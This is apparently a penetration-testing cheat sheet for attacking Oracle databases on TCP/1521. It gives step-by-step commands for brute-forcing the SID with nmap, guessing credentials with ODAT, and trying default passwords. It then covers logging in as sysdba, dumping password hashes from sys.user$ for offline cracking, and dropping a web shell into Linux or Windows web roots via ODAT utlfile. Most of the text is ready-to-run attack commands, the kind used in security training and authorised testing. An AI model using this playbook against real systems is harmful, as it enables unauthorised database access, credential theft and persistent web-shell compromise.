1. Identify Oracle TNS on TCP/1521 and confirm it is **unauthorized** or open.
2. Enumerate the **SID** (System Identifier) using Nmap scripts or ODAT.
3. Bruteforce credentials using ODAT `all` or specific guessing modules.
4. Access the instance via `sqlplus` using discovered credentials and the SID.
5. Attempt elevation to **sysdba** to bypass standard user restrictions.
6. Extract password hashes from the **sys.user$** table for offline cracking.
7. If a web server is present, leverage `utlfile` via ODAT to drop a web shell.

---

## Service Discovery

Standard TNS listener detection when TCP/1521 is open.

Initial scan to confirm service version and basic status

```
sudo nmap -p<PORT> -sV <TARGET_IP> --open
```

## SID Enumeration

TCP/1521 is open but the specific database instance name is unknown. **Incorrect SID** prevents any further connection or authentication attempts.

Brute force the SID using Nmap

```
sudo nmap -p1521 -sV <TARGET_IP> --open --script oracle-sid-brute
```

> ⚠️ Gap: Authentication will fail silently if the SID is not specified or guessed correctly, as Oracle requires the SID to route the connection to the correct memory structure.

## Credential Guessing

SID is known and the listener is confirmed reachable.

Run all ODAT modules to find valid users and passwords

```
./odat.py all -s <TARGET_IP>
```

- Nmap: Use for initial discovery and quick SID scripts.
    
- ODAT: Use for comprehensive service-wide guessing and specific exploitation modules.
    
- Oracle 9 default: `CHANGE_ON_INSTALL`.
    
- Oracle DBSNMP default: `dbsnmp`.
    

## Database Interaction

Valid credentials and SID are acquired.

Connect to the instance to run manual queries

```
sqlplus <USERNAME>/<PASSWORD>@<TARGET_IP>/<SERVICE_NAME>
```

List all tables available to the current user

```
select table_name from all_tables;
```

Check current user roles and permissions

```
select * from user_role_privs;
```

> ⚠️ Gap: `sqlplus` often fails on Linux due to missing shared libraries. If `libsqlplus.so` is not found, the library path must be added to the system configuration.

Fix missing shared library errors

```
sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf"
sudo ldconfig
```

## Administrative Access

Authenticated as a low-privileged user like `scott`.

Attempt to log in with **sysdba** privileges

```
sqlplus <USERNAME>/<PASSWORD>@<TARGET_IP>/<SERVICE_NAME> as sysdba
```

## Credential Extraction

Logged in with high privileges (sysdba).

Query the system table for usernames and password hashes

```
select name, password from sys.user$;
```

## File System Interaction

Valid credentials (ideally sysdba) exist and the target is likely hosting a web service.

Upload a test file or web shell to a known web root

```
./odat.py utlfile -s <TARGET_IP> -d <SERVICE_NAME> -U <USERNAME> -P <PASSWORD> --sysdba --putFile <FILE_PATH> <FILE_NAME> ./<LOCAL_FILE>
```

- Linux: `/var/www/html`.
- Windows: `C:\inetpub\wwwroot`.

Verify file upload success via web request

```
curl -X GET http://<TARGET_IP>/<FILE_NAME>
```

> ⚠️ Gap: `utlfile` exploitation will fail if the exact **root directory** for the web server is not provided or if the server is not running a web service.